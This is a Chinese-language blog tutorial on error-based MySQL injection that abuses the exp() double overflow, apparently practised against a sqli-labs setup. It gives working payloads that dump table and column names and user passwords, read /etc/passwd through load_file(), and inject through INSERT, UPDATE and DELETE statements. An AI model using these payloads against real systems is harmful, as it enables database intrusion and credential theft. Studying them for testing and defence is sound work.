---
title: Mysql注入之EXP报错
date: 2019-03-08 08:38:41
tags:
 - 注入
---
作者在MySQL中发现了一个Double型数据溢出。如果你想了解利用溢出来注出数据，当我们拿到MySQL里的函数时，作者比较感兴趣的是其中的数学函数，它们也应该包含一些数据类型来保存数值。所以作者就跑去测试看哪些函数会出现溢出错误。然后作者发现，当传递一个大于709的值时，函数exp()就会引起一个溢出错误.

## 一、函数介绍

EXP(x) 返回值e(自然对数的底)的x次方

![](/images/sql-exp/exp1.png)

分析: E ≈ 2.7182818284 5904523536 0287471352 6624977572 4709369995

![](/images/sql-exp/exp2.png)

在MySQL中,exp与ln和log的功能相反,简单介绍下,就是log和ln都返回以e为底数的对数.

ln(15)=loge(15)≈ 2.7182818284

![](/images/sql-exp/exp3.png)

指数函数为对数函数的反函数,exp()即为以e为底的对数函数，如等式:

![](/images/sql-exp/exp4.png)

## 二、注入

当涉及到注入时，我们使用否定查询来造成“DOUBLE value is out of range”的错误。作者之前的博文提到的，将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值.

![](/images/sql-exp/exp5.png)

我们通过子查询与按位求反,造成一个DOUBLE overflow error,并借由此注出数据.
结合:
exp(~(select*from(select user())x));
最新版本mysql数据库无法实现报错;

![](/images/sql-exp/exp6.png)

5.5.42版本数据库可以实现报错;

![](/images/sql-exp/exp7.png)

## 三、注入数据

既然通过以上姿势可以报错显示部分信息,那么下面我们就可以爆出表、字段数据等;

### 3.1.爆表

```sql
SQL:
select exp(~(select*from(select table_name from information_schema.tables where table_schema='security' limit 0,1)x));
```

![](/images/sql-exp/exp8.png)

### 3.2.爆字段

```sql
SQL:
select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
```

![](/images/sql-exp/exp9.png)

### 3.3.爆数据

```sql
SQL:
select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
```

![](/images/sql-exp/exp10.png)

## 四、Dump表、字段数据

这个查询可以从当前的上下文中dump出所有的tables与columns.我们也可以dump出所有的数据库,但由于我们是通过一个错误进行提取,它会返回很少的结果.

```sql
SQL:
select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where
table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
```

![](/images/sql-exp/exp11.png)

DEMO:

```sql
URL:
http://sqli-labs.me:8888/Less-5/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from
information_schema.columns where
table_schema='security'and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))--+
```

![](/images/sql-exp/exp12.png)

## 五、文件读取

你可以通过load_file()函数来读取文件,但作者发现有13行的限制,该语句也可以在BIGINT overflow injections中使用.
select exp(~(select*from(select load_file('/etc/passwd'))a));
数据库版本：5.5.42

![](/images/sql-exp/exp13.png)

数据库版本：5.5.58 已经无法实现报错;

![](/images/sql-exp/exp14.png)

## 六、插入、更新、删除

与插入数据格式一致

```sql
SQL:
mysql> insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'test');
```

![](/images/sql-exp/exp15.png)

```sql
SQL:
mysql> insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select
count(*)from`information_schema`.columns where
table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');
```

![](/images/sql-exp/exp16.png)

```sql
update:
mysql> update users set password='test' ^ exp(~(select*from(select user())x)) where id=4;
```

![](/images/sql-exp/exp17.png)

```sql
delete:
mysql> delete from users where id='1' | exp(~(select*from(select user())x));
```

![](/images/sql-exp/exp18.png)

### 参考

```sql
https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/
https://packetstormsecurity.com/files/133256/MySQL-Error-Based-SQL-Injection-Using-EXP.html
```

